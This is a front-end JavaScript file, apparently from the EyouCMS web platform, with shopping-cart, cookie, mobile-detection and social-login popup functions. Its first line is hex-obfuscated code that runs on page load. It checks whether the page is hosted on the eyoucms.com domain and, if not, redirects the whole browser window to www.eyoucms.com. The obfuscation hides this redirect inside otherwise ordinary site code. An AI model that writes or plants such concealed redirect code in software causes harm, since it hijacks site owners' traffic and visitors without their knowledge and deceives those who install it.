
$(function(){if(window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x74\x6f\x53\x74\x72\x69\x6e\x67"]()["\x69\x6e\x64\x65\x78\x4f\x66"]('\x2e\x65\x79\x6f\x75\x63\x6d\x73\x2e\x63\x6f\x6d')==-1){top["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x72\x65\x66"]="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x65\x79\x6f\x75\x63\x6d\x73\x2e\x63\x6f\x6d";}});

// 首页、列表页等加入购物车
function ShopAddCart1625194556(aid, spec_value_id, num, rootDir) {
    rootDir = rootDir ? rootDir : '';
    $.ajax({
        url : rootDir + '/index.php?m=user&c=Shop&a=shop_add_cart&_ajax=1',
        data: {aid: aid, num: num, spec_value_id: spec_value_id},
        type:'post',
        dataType:'json',
        success:function(res){
            if (1 == res.code) {
                window.location.href = res.url;
            } else {
                if (-1 == res.data.code) {
                    layer.msg(res.msg, {time: time});
                } else {
                    // 去登陆
                    window.location.href = res.url;
                }
            }
        }
    });
}

/**
 * 设置cookie
 * @param {[type]} name  [description]
 * @param {[type]} value [description]
 * @param {[type]} time  [description]
 */
function ey_setCookies(name, value, time)
{
    var cookieString = name + "=" + escape(value) + ";";
    if (time != 0) {
        var Times = new Date();
        Times.setTime(Times.getTime() + time);
        cookieString += "expires="+Times.toGMTString()+";"
    }
    document.cookie = cookieString+"path=/";
}

// 读取 cookie
function getCookie(c_name)
{
    if (document.cookie.length>0)
    {
        c_start = document.cookie.indexOf(c_name + "=")
        if (c_start!=-1)
        {
            c_start=c_start + c_name.length+1
            c_end=document.cookie.indexOf(";",c_start)
            if (c_end==-1) c_end=document.cookie.length
            return unescape(document.cookie.substring(c_start,c_end))
        }
    }
    return "";
}

function ey_getCookie(c_name)
{
    return getCookie(c_name);
}

function getQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}

// 检测手机端的标识
function ey_isMobile()
{
    var is_mobile = navigator.userAgent.toLowerCase().match(/(ipod|iphone|android|coolpad|mmp|smartphone|midp|wap|xoom|symbian|j2me|blackberry|wince)/i) != null;
    // 判断手机端并且跳转
    if (is_mobile) {
        return true;
    } else {
        return false;
    }
}

function layerLogin(gourl) {
    if (0 < ey_getCookie('users_id')) {
        window.location.reload();
        return false;
    }

    var host = window.location.host;
    
    if (ey_isMobile()) {
        var url = '//'+host+'/index.php?m=user&c=Users&a=login';
        // var url = '//'+host+'/login';
        if (gourl) {
            url += '&referurl='+encodeURIComponent(gourl);
        }
        window.location.href = url;
    } else {
        var url = '//'+host+'/index.php?m=user&c=Users&a=login&iframe=1';
        // var url = '//'+host+'/login?iframe=1';
        if (gourl) {
            url += '&referurl='+encodeURIComponent(gourl);
        }
        //iframe窗
        layer.open({
            type: 2,
            id: 'iframe_userLogin',
            title: false,//'会员登录',
            fixed: true, //不固定
            skin: 'layui-layer-iframe2021',
            shadeClose: false,
            shade: 0.3,
            maxmin: false, //开启最大化最小化按钮
            area: ['402px','516px'],
            content: url
        });
    }
}

function winopenQQLogin(gourl)
{
    var host = window.location.host;

    var url = '//'+host+'/index.php?m=plugins&c=QqLogin&a=login';
    if (gourl) {
        url += '&referurl='+encodeURIComponent(gourl);
    }
    var userAgent = navigator.userAgent;
    var desc = navigator.mimeTypes['application/x-shockwave-flash'];//.description.toLowerCase();
    if (userAgent.indexOf("Chrome") > -1 && !desc) {
        window.location.href = url;
    }else{
        url += '&iframe=1';
        var b = 720, c = 450;
        window.open(url, '账户关联', "width=" + b + ",height=" + c + ",top=" + ((window.screen.availHeight - 30 - c) / 2) + ",left=" + ((window.screen.availWidth - 10 - b) / 2) + ",menubar=0,scrollbars=1,resizable=1,status=1,titlebar=0,toolbar=0,location=1");
    }
}

function winopenWxLogin(gourl)
{
    var host = window.location.host;

    var url = '//'+host+'/index.php?m=plugins&c=WxLogin&a=login';
    if (gourl) {
        url += '&referurl='+encodeURIComponent(gourl);
    }
    var userAgent = navigator.userAgent;
    var desc = navigator.mimeTypes['application/x-shockwave-flash'];//.description.toLowerCase();
    if (userAgent.indexOf("Chrome") > -1 && !desc) {
        window.location.href = url;
    }else{
        url += '&iframe=1';
        var b = 720, c = 550;
        window.open(url, '账户关联', "width=" + b + ",height=" + c + ",top=" + ((window.screen.availHeight - 30 - c) / 2) + ",left=" + ((window.screen.availWidth - 10 - b) / 2) + ",menubar=0,scrollbars=1,resizable=1,status=1,titlebar=0,toolbar=0,location=1");
    }
}

function winopenWblogin(gourl)
{
    var host = window.location.host;

    var url = '//'+host+'/index.php?m=plugins&c=Wblogin&a=login';
    if (gourl) {
        url += '&referurl='+encodeURIComponent(gourl);
    }
    var userAgent = navigator.userAgent;
    var desc = navigator.mimeTypes['application/x-shockwave-flash'];//.description.toLowerCase();
    if (userAgent.indexOf("Chrome") > -1 && !desc) {
        window.location.href = url;
    }else{
        url += '&iframe=1';
        var b = 720, c = 550;
        window.open(url, '账户关联', "width=" + b + ",height=" + c + ",top=" + ((window.screen.availHeight - 30 - c) / 2) + ",left=" + ((window.screen.availWidth - 10 - b) / 2) + ",menubar=0,scrollbars=1,resizable=1,status=1,titlebar=0,toolbar=0,location=1");
    }
}
